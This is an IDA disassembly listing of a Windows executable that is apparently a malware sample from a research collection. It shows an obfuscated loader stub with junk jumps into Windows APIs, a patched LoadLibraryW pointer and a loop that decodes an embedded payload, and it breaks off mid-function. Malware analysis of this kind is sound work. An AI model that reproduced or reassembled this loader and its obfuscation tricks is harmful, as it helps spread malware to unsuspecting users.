;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
; Input	MD5   :	1B2CDDFECE2482924960A2B26ADCF95D
; Input	CRC32 :	088C49D8

; File Name   :	c:\Users\farhadi\Desktop\Sample\samples\1b2cddfece2482924960a2b26adcf95d
; Format      :	Portable executable for	80386 (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 00001794 (   6036.)
; Section size in file		: 00001800 (   6144.)
; Offset to raw	data for section: 0005E400
; Flags	60000020: Text Executable Readable
; Alignment	: default

		include	uni.inc	; see unicode subdir of	ida for	info on	unicode

		.686p
		.mmx
		.model flat

; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 401000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
		db 90h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401090	proc near		; CODE XREF: start+3Fj
		mov	edi, edi
		push	ebp

loc_401093:				; CODE XREF: sub_401090+13j
		mov	ebp, esp
		sub	esp, 38h
		mov	ecx, offset dword_4BA21C
		cmp	ecx, 1B26h
		jz	short loc_401093
		push	ecx
		push	0
		rep call sub_4010B5
		mov	eax, ds:SetFocus
		jmp	eax
sub_401090	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4010B5	proc near		; CODE XREF: sub_401090+18p
		pop	ecx
		call	ecx
		pop	ecx
		push	ecx
		push	ebx
		push	dword ptr [ecx+144h]
		push	edi
		call	sub_4019C4
		add	esp, 0Ch
		pop	ecx
		mov	edx, offset GetModuleHandleA
		mov	edx, [edx]
		push	edx
		push	dword ptr [ecx-14h]
		pop	eax
		call	eax
		add	esp, 38h
		pop	ebp
		retn	0
sub_4010B5	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4010E0	proc near		; CODE XREF: sub_401280+1Fp
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 30h
		lea	edi, [edx-0C4h]
		xor	dword ptr [edi+298h], 0FFFFFFF2h
		mov	esi, 0
		push	esi
		rep call sub_401108
		mov	eax, ds:PulseEvent
		jmp	eax
sub_4010E0	endp


; =============== S U B	R O U T	I N E =======================================


sub_401108	proc near		; CODE XREF: sub_4010E0+1Bp
		pop	ecx
		call	ecx
		push	edi
		push	ebx
		push	dword ptr [edi+120h]
		call	sub_401BE8
		add	esp, 8
		pop	edi
		push	0
		rep call sub_40112B
		mov	eax, ds:CloseHandle
		jmp	eax
sub_401108	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_40112B	proc near		; CODE XREF: sub_401108+16p
		pop	ecx
		call	ecx
		add	esp, 30h
		pop	ebp
		retn	0
sub_40112B	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 63h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401198	proc near		; CODE XREF: sub_401C0E+17p

var_2C		= dword	ptr -2Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 60h
		lea	ebx, [ecx+0A4h]
		or	edx, [ebp+var_2C]
		push	ebx
		push	ecx
		push	edi
		push	dword ptr [ebx+3E4h]
		push	dword ptr [ebx+3B4h]
		call	sub_401CD4
		add	esp, 10h
		pop	ebx
		push	0
		rep call sub_4011D0
		mov	eax, ds:LocalFree
		jmp	eax
sub_401198	endp


; =============== S U B	R O U T	I N E =======================================


sub_4011D0	proc near		; CODE XREF: sub_401198+2Bp
		pop	ecx
		call	ecx
		mov	edx, 0
		push	edx
		rep call sub_4011E6
		mov	eax, ds:lstrlenA
		jmp	eax
sub_4011D0	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4011E6	proc near		; CODE XREF: sub_4011D0+9p
		pop	ecx
		call	ecx
		add	esp, 60h
		pop	ebp
		retn	0
sub_4011E6	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4011F0	proc near		; CODE XREF: sub_401884+1Ap

var_C		= dword	ptr -0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 20h
		lea	esi, dword_4BA1DC
		sub	[ebp+var_C], 0FFFFFFEFh
		push	0
		rep call sub_401211
		mov	eax, ds:lstrlenA
		jmp	eax
sub_4011F0	endp


; =============== S U B	R O U T	I N E =======================================


sub_401211	proc near		; CODE XREF: sub_4011F0+14p
		pop	ecx
		call	ecx
		push	esi
		push	dword ptr [esi+108h]
		push	dword ptr [esi+29Ch]
		push	dword ptr [esi+2B0h]
		call	sub_4016D0
		add	esp, 0Ch
		pop	esi
		mov	ebx, 0
		push	ebx
		rep call sub_401243
		mov	eax, ds:Sleep
		jmp	eax
sub_401211	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401243	proc near		; CODE XREF: sub_401211+25p
		pop	ecx
		call	ecx
		add	esp, 20h
		pop	ebp
		retn	0
sub_401243	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 33h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401280	proc near		; CODE XREF: sub_401F2D+7p
		mov	edi, edi
		push	ebp

loc_401283:				; CODE XREF: sub_401280+14j
		mov	ebp, esp
		sub	esp, 40h
		lea	edx, [eax-244h]
		cmp	edx, 9E0h
		jb	short loc_401283
		push	edx
		push	ebx
		push	dword ptr [edx+3B0h]
		push	edi
		call	sub_4010E0
		add	esp, 0Ch
		pop	edx
		push	edx
		rep call sub_4012B6
		mov	eax, ds:GetTickCount
		jmp	eax
sub_401280	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4012B6	proc near		; CODE XREF: sub_401280+29p
		pop	ecx
		call	ecx
		pop	edx
		push	edx
		push	0
		rep call sub_4012CA
		mov	eax, ds:SetFocus
		jmp	eax
sub_4012B6	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4012CA	proc near		; CODE XREF: sub_4012B6+7p
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 40h
		pop	ebp
		retn	0
sub_4012CA	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4012D8	proc near		; CODE XREF: sub_401D84+24p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 58h
		mov	edx, offset dword_4BA218
		sbb	ecx, esi
		push	edx
		push	esi
		push	dword ptr [edx+138h]
		call	sub_401684
		add	esp, 8
		pop	edx
		push	edx
		push	0
		rep call sub_401308
		mov	eax, ds:GetDC
		jmp	eax
sub_4012D8	endp


; =============== S U B	R O U T	I N E =======================================


sub_401308	proc near		; CODE XREF: sub_4012D8+23p
		pop	ecx
		call	ecx
		pop	edx
		push	edx
		push	0
		rep call sub_40131C
		mov	eax, ds:UnmapViewOfFile
		jmp	eax
sub_401308	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_40131C	proc near		; CODE XREF: sub_401308+7p
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 58h
		pop	ebp
		retn	0
sub_40131C	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 31h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401358	proc near		; CODE XREF: sub_4019C4+1Ep

var_34		= dword	ptr -34h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 44h
		lea	edx, dword_4BA228
		xor	edi, [ebp+var_34]
		push	edx
		push	0
		rep call sub_401379
		mov	eax, ds:LocalUnlock
		jmp	eax
sub_401358	endp


; =============== S U B	R O U T	I N E =======================================


sub_401379	proc near		; CODE XREF: sub_401358+14p
		pop	ecx
		call	ecx
		pop	edx
		push	edx
		push	ecx
		push	dword ptr [edx+1FCh]
		push	ecx
		call	sub_401D84
		add	esp, 0Ch
		pop	edx
		push	edx
		mov	esi, 0
		push	esi
		rep call sub_4013A3
		mov	eax, ds:LocalFree
		jmp	eax
sub_401379	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4013A3	proc near		; CODE XREF: sub_401379+1Dp
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 44h
		pop	ebp
		retn	0
sub_4013A3	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 32h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4013E0	proc near		; CODE XREF: sub_401460+Ap
		mov	edi, edi
		push	ebp

loc_4013E3:				; CODE XREF: sub_4013E0+14j
		mov	ebp, esp
		sub	esp, 38h
		lea	edx, [eax+2D8h]
		cmp	edx, 5D4Ch
		jbe	short loc_4013E3
		push	edx
		push	edi
		push	dword ptr [edx+190h]
		push	edi
		push	edi
		call	sub_401C4C
		add	esp, 10h
		pop	edx
		push	edx

loc_40140A:				; CODE XREF: sub_40141E+5j
		lea	ebx, [edx-330h]
		push	ebx
		rep call sub_40141E
		mov	eax, ds:GetModuleHandleA
		jmp	eax
sub_4013E0	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_40141E	proc near		; CODE XREF: sub_4013E0+31p
		pop	ecx
		call	ecx
		test	eax, eax
		jnz	short loc_40140A
		pop	edx
		push	edx
		rep call sub_401434
		mov	eax, ds:GetTickCount
		jmp	eax
sub_40141E	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401434	proc near		; CODE XREF: sub_40141E+9p
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 38h
		pop	ebp
		retn	0
sub_401434	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401440	proc near		; CODE XREF: sub_401DE4+25p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 38h
		lea	eax, asc_4BA058	; "					  "...
		or	edx, ecx
		push	eax
		push	0
		rep call sub_401460
		mov	eax, ds:SetLastError
		jmp	eax
sub_401440	endp


; =============== S U B	R O U T	I N E =======================================


sub_401460	proc near		; CODE XREF: sub_401440+13p
		pop	ecx
		call	ecx
		pop	eax
		push	eax
		push	esi
		push	edi
		push	dword ptr [eax+7Ch]
		call	sub_4013E0
		add	esp, 0Ch
		pop	eax
		push	eax
		push	0
		rep call sub_401483
		mov	eax, ds:LocalUnlock
		jmp	eax
sub_401460	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401483	proc near		; CODE XREF: sub_401460+16p
		pop	ecx
		call	ecx
		pop	eax
		add	esp, 38h
		pop	ebp
		retn	0
sub_401483	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401490	proc near		; CODE XREF: sub_401C70+Bp

var_2C		= dword	ptr -2Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 54h
		mov	esi, 4BA07Ch
		adc	[ebp+var_2C], 0FFFFB552h
		push	0
		rep call sub_4014B3
		mov	eax, ds:SetEvent
		jmp	eax
sub_401490	endp


; =============== S U B	R O U T	I N E =======================================


sub_4014B3	proc near		; CODE XREF: sub_401490+16p
		pop	ecx
		call	ecx
		push	esi
		push	ebx
		push	dword ptr [esi+138h]
		call	sub_401F8C
		add	esp, 8
		pop	esi
		rep call sub_4014D4
		mov	eax, ds:GetCommandLineW
		jmp	eax
sub_4014B3	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4014D4	proc near		; CODE XREF: sub_4014B3+14p
		pop	ecx
		call	ecx
		add	esp, 54h
		pop	ebp
		retn	0
sub_4014D4	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 92h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401570	proc near		; CODE XREF: sub_4016A3+Cp

var_14		= dword	ptr -14h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 20h
		mov	eax, offset dword_4BA190
		xor	[ebp+var_14], ebx
		push	eax
		mov	ecx, 0
		push	ecx
		rep call sub_401594
		mov	eax, ds:lstrlenA
		jmp	eax
sub_401570	endp


; =============== S U B	R O U T	I N E =======================================


sub_401594	proc near		; CODE XREF: sub_401570+17p
		pop	ecx
		call	ecx
		pop	eax
		push	eax
		push	dword ptr [eax+120h]
		push	esi
		call	sub_401B04
		add	esp, 8
		pop	eax
		push	eax
		rep call sub_4015B7
		mov	eax, ds:GetTickCount
		jmp	eax
sub_401594	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4015B7	proc near		; CODE XREF: sub_401594+16p
		pop	ecx
		call	ecx
		pop	eax
		add	esp, 20h
		pop	ebp
		retn	0
sub_4015B7	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 0C2h	dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401684	proc near		; CODE XREF: sub_4012D8+17p

var_34		= dword	ptr -34h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 38h
		mov	ebx, offset dword_4BA3C8
		xor	[ebp+var_34], esi
		push	0
		rep call sub_4016A3
		mov	eax, ds:SetLastError
		jmp	eax
sub_401684	endp


; =============== S U B	R O U T	I N E =======================================


sub_4016A3	proc near		; CODE XREF: sub_401684+12p
		pop	ecx
		call	ecx
		push	ebx
		push	dword ptr [ebx+150h]
		push	eax
		push	edx
		call	sub_401570
		add	esp, 0Ch
		pop	ebx
		rep call sub_4016C5
		mov	eax, ds:GetCommandLineW
		jmp	eax
sub_4016A3	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4016C5	proc near		; CODE XREF: sub_4016A3+15p
		pop	ecx
		call	ecx
		add	esp, 38h
		pop	ebp
		retn	0
sub_4016C5	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4016D0	proc near		; CODE XREF: sub_401211+16p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 44h
		lea	ecx, dword_4BA238
		or	dword ptr [ecx+158h], 5Eh
		push	ecx
		push	edi
		push	ebx
		push	dword ptr [ecx+4]
		push	dword ptr [ecx+80h]
		call	sub_401DE4
		add	esp, 10h
		pop	ecx
		push	ecx
		rep call sub_401708
		mov	eax, ds:GetCommandLineW
		jmp	eax
sub_4016D0	endp


; =============== S U B	R O U T	I N E =======================================


sub_401708	proc near		; CODE XREF: sub_4016D0+2Bp
		pop	ecx
		call	ecx
		pop	ecx
		push	ecx
		push	0
		rep call sub_40171C
		mov	eax, ds:SetLastError
		jmp	eax
sub_401708	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_40171C	proc near		; CODE XREF: sub_401708+7p
		pop	ecx
		call	ecx
		pop	ecx
		add	esp, 44h
		pop	ebp
		retn	0
sub_40171C	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401728	proc near		; CODE XREF: sub_401FAB+Cp

var_30		= dword	ptr -30h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 60h
		mov	edi, offset dword_4BA350
		add	[ebp+var_30], ecx
		push	0
		rep call sub_401747
		mov	eax, ds:Sleep
		jmp	eax
sub_401728	endp


; =============== S U B	R O U T	I N E =======================================


sub_401747	proc near		; CODE XREF: sub_401728+12p
		pop	ecx
		call	ecx
		push	edi
		push	ebx
		push	ebx
		push	dword ptr [edi+1Ch]
		call	sub_401F04
		add	esp, 0Ch
		pop	edi
		mov	eax, 0
		push	eax
		rep call sub_40176C
		mov	eax, ds:Sleep
		jmp	eax
sub_401747	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_40176C	proc near		; CODE XREF: sub_401747+18p
		pop	ecx
		call	ecx
		add	esp, 60h
		pop	ebp
		retn	0
sub_40176C	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 32h dup(90h)

; =============== S U B	R O U T	I N E =======================================


		public start
start		proc near

var_4		= dword	ptr -4

		mov	ecx, offset lstrlenA
		push	0

loc_4017AF:				; CODE XREF: start+49j
		pop	eax
		call	ds:CreateThread
		add	esp, 0FFFFFFE8h
		xor	eax, eax
		lea	eax, ds:4BA100h[eax*4]
		lea	ecx, [eax+0Ah]
		add	byte ptr [ecx],	4
		push	eax		; lpLibFileName
		call	ds:LoadLibraryW
		push	3Ch
		add	[esp+4+var_4], eax
		pop	ecx
		mov	ecx, [ecx]
		sub	ecx, 0FFFFFFAFh
		mov	eax, [eax+ecx]
		shr	eax, 4
		mov	cl, 25h
		cmp	al, cl
		pusha
		jg	short near ptr loc_4017E7+5

loc_4017E7:				; CODE XREF: start+3Dj
		jb	sub_401090
		popa
		call	dword ptr [esp+0]
		jb	short loc_4017AF
		cmp	[eax-6F6F6F70h], dl
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
start		endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401884	proc near		; CODE XREF: sub_401AA2+Dp
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 50h
		lea	edi, [edx-27Ch]
		add	ebx, 73h
		push	edi
		push	ebx
		push	dword ptr [edi+2D0h]
		push	ecx
		call	sub_4011F0
		add	esp, 0Ch
		pop	edi
		push	0
		rep call sub_4018B6
		mov	eax, ds:LocalUnlock
		jmp	eax
sub_401884	endp


; =============== S U B	R O U T	I N E =======================================


sub_4018B6	proc near		; CODE XREF: sub_401884+25p
		pop	ecx
		call	ecx
		push	0
		rep call sub_4018C8
		mov	eax, ds:SetLastError
		jmp	eax
sub_4018B6	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4018C8	proc near		; CODE XREF: sub_4018B6+5p
		pop	ecx
		call	ecx
		add	esp, 50h
		pop	ebp
		retn	0
sub_4018C8	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 0F2h	dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4019C4	proc near		; CODE XREF: sub_4010B5+Dp

var_40		= dword	ptr -40h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 5Ch
		mov	edi, offset dword_4BA13C
		and	ecx, [ebp+var_40]
		push	edi
		push	dword ptr [edi+348h]
		push	eax
		push	dword ptr [edi+2C0h]
		call	sub_401358
		add	esp, 0Ch
		pop	edi
		mov	ecx, 0
		push	ecx
		rep call sub_4019FE
		mov	eax, ds:SetLastError
		jmp	eax
sub_4019C4	endp


; =============== S U B	R O U T	I N E =======================================


sub_4019FE	proc near		; CODE XREF: sub_4019C4+2Dp
		pop	ecx
		call	ecx
		mov	edx, 0
		push	edx
		rep call sub_401A14
		mov	eax, ds:PulseEvent
		jmp	eax
sub_4019FE	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401A14	proc near		; CODE XREF: sub_4019FE+9p
		pop	ecx
		call	ecx
		add	esp, 5Ch
		pop	ebp
		retn	0
sub_401A14	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 62h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401A80	proc near		; CODE XREF: sub_401B24+6p

var_34		= dword	ptr -34h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 3Ch
		lea	edx, dword_4BA2F8
		sbb	[ebp+var_34], 0FFFFFFA5h
		push	edx
		push	0
		rep call sub_401AA2
		mov	eax, ds:Sleep
		jmp	eax
sub_401A80	endp


; =============== S U B	R O U T	I N E =======================================


sub_401AA2	proc near		; CODE XREF: sub_401A80+15p
		pop	ecx
		call	ecx
		pop	edx
		push	edx
		push	dword ptr [edx+314h]
		push	esi
		push	ebx
		call	sub_401884
		add	esp, 0Ch
		pop	edx
		push	edx
		rep call sub_401AC6
		mov	eax, ds:GetCommandLineW
		jmp	eax
sub_401AA2	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401AC6	proc near		; CODE XREF: sub_401AA2+17p
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 3Ch
		pop	ebp
		retn	0
sub_401AC6	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 33h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401B04	proc near		; CODE XREF: sub_401594+Cp
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 38h
		mov	edi, offset dword_4BA1BC
		sbb	ecx, [edi+1F0h]
		rep call sub_401B24
		mov	eax, ds:GetTickCount
		jmp	eax
sub_401B04	endp


; =============== S U B	R O U T	I N E =======================================


sub_401B24	proc near		; CODE XREF: sub_401B04+13p
		pop	ecx
		call	ecx
		push	edi
		push	edx
		push	ebx
		call	sub_401A80
		add	esp, 8
		pop	edi
		lea	esi, [edi-1BCh]	; CODE XREF: sub_401B47+5j
		push	esi
		rep call sub_401B47
		mov	eax, ds:GetModuleHandleA
		jmp	eax
sub_401B24	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401B47	proc near		; CODE XREF: sub_401B24+16p
		pop	ecx
		call	ecx
		test	eax, eax
		jnz	short near ptr loc_401B33+1
		add	esp, 38h
		pop	ebp
		retn	0
sub_401B47	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 93h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401BE8	proc near		; CODE XREF: sub_401108+Bp
		mov	edi, edi
		push	ebp

loc_401BEB:				; CODE XREF: sub_401BE8+14j
		mov	ebp, esp
		sub	esp, 30h
		lea	ecx, [edi+0B0h]
		cmp	ecx, 3E63h
		jz	short loc_401BEB
		push	ecx
		push	0
		rep call sub_401C0E
		mov	eax, ds:SetLastError
		jmp	eax
sub_401BE8	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401C0E	proc near		; CODE XREF: sub_401BE8+19p
		pop	ecx
		call	ecx
		pop	ecx
		push	ecx
		push	dword ptr [ecx+314h]
		push	dword ptr [ecx+100h]
		push	dword ptr [ecx+3C8h]
		call	sub_401198
		add	esp, 0Ch
		pop	ecx
		push	ecx
		push	0
		rep call sub_401C3E
		mov	eax, ds:LocalUnlock
		jmp	eax
sub_401C0E	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401C3E	proc near		; CODE XREF: sub_401C0E+23p
		pop	ecx
		call	ecx
		pop	ecx
		add	esp, 30h
		pop	ebp
		retn	0
sub_401C3E	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401C4C	proc near		; CODE XREF: sub_4013E0+20p

var_18		= dword	ptr -18h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 50h
		lea	ebx, dword_4BA26C
		sbb	[ebp+var_18], ecx
		mov	edx, 0
		push	edx
		rep call sub_401C70
		mov	eax, ds:lstrlenA
		jmp	eax
sub_401C4C	endp


; =============== S U B	R O U T	I N E =======================================


sub_401C70	proc near		; CODE XREF: sub_401C4C+17p
		pop	ecx
		call	ecx
		push	ebx
		push	dword ptr [ebx+260h]
		push	esi
		call	sub_401490
		add	esp, 8
		pop	ebx
		mov	ecx, 0
		push	ecx
		rep call sub_401C97
		mov	eax, ds:GetDC
		jmp	eax
sub_401C70	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401C97	proc near		; CODE XREF: sub_401C70+1Ap
		pop	ecx
		call	ecx
		add	esp, 50h
		pop	ebp
		retn	0
sub_401C97	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 33h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401CD4	proc near		; CODE XREF: sub_401198+20p

var_68		= dword	ptr -68h
var_54		= dword	ptr -54h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 58h
		and	ecx, [ebp+var_54]
		mov	edi, offset dword_4BA1C0
		mov	edx, 6B4h
		push	edx
		mov	edx, 6B4h
		push	edx
		mov	esi, 40001h
		push	esi
		mov	ecx, 0B9C59E19h
		push	dword ptr [ecx+467A9213h]
		sub	[esp+68h+var_68], 2
		mov	ecx, offset LoadLibraryW
		pop	dword ptr [ecx]
		rep call sub_401D19
		mov	eax, ds:LoadLibraryW
		jmp	eax
sub_401CD4	endp


; =============== S U B	R O U T	I N E =======================================


sub_401D19	proc near		; CODE XREF: sub_401CD4+38p
		pop	ecx
		call	ecx
		push	eax
		pop	dword ptr [edi+48h]
		mov	edx, [edi+48h]
		lea	eax, [edx]
		sub	ebx, ebx
		dec	ebx
		and	ebx, offset word_4020D2
		mov	edx, 467A987Ah
		push	dword ptr [ebx]
		pop	dword ptr [eax]
		add	ebx, 1
		add	eax, 1
		push	6B4h
		pop	ecx

loc_401D43:				; CODE XREF: sub_401D19+49j
		xor	esi, esi
		push	dword ptr [ebx]
		adc	[esp+0], edx
		pop	dword ptr [eax+esi*2]
		sub	edx, edx
		sbb	edx, [ebx+edx*4]
		neg	edx
		shr	edx, 1
		add	ebx, 4
		add	eax, 4
		sub	ecx, 4
		cmp	ecx, 0
		jnz	short loc_401D43
		mov	eax, 0
		push	eax
		rep call sub_401D77
		mov	eax, ds:lstrlenA
		jmp	eax
sub_401D19	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401D77	proc near		; CODE XREF: sub_401D19+51p
		pop	ecx
		call	ecx
		add	esp, 58h
		pop	ebp
		retn	0
sub_401D77	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401D84	proc near		; CODE XREF: sub_401379+Dp
		mov	edi, edi
		push	ebp

loc_401D87:				; CODE XREF: sub_401D84+13j
		mov	ebp, esp
		sub	esp, 38h
		mov	ecx, offset dword_4BA320
		cmp	ecx, 1C9Ah
		jbe	short loc_401D87
		push	ecx
		push	dword ptr [ecx+3E4h]
		push	edx
		push	ebx
		push	dword ptr [ecx+114h]
		call	sub_4012D8
		add	esp, 10h
		pop	ecx
		push	ecx
		push	0
		rep call sub_401DC1
		mov	eax, ds:LocalUnlock
		jmp	eax
sub_401D84	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401DC1	proc near		; CODE XREF: sub_401D84+30p
		pop	ecx
		call	ecx
		pop	ecx
		push	ecx
		mov	edx, 0
		push	edx
		rep call sub_401DD9
		mov	eax, ds:GetDC
		jmp	eax
sub_401DC1	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401DD9	proc near		; CODE XREF: sub_401DC1+Bp
		pop	ecx
		call	ecx
		pop	ecx
		add	esp, 38h
		pop	ebp
		retn	0
sub_401DD9	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401DE4	proc near		; CODE XREF: sub_4016D0+21p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 54h
		mov	ebx, 4BA0D0h
		mov	dword ptr [ebx+294h], 3524h
		push	ebx
		push	dword ptr [ebx+2CCh]
		push	dword ptr [ebx+3B0h]
		push	esi
		call	sub_401440
		add	esp, 0Ch
		pop	ebx
		mov	edx, 0
		push	edx
		rep call sub_401E25
		mov	eax, ds:IsWindow
		jmp	eax
sub_401DE4	endp


; =============== S U B	R O U T	I N E =======================================


sub_401E25	proc near		; CODE XREF: sub_401DE4+34p
		pop	ecx
		call	ecx
		push	0
		rep call sub_401E37
		mov	eax, ds:LocalFree
		jmp	eax
sub_401E25	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401E37	proc near		; CODE XREF: sub_401E25+5p
		pop	ecx
		call	ecx
		add	esp, 54h
		pop	ebp
		retn	0
sub_401E37	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 0C3h	dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401F04	proc near		; CODE XREF: sub_401747+9p

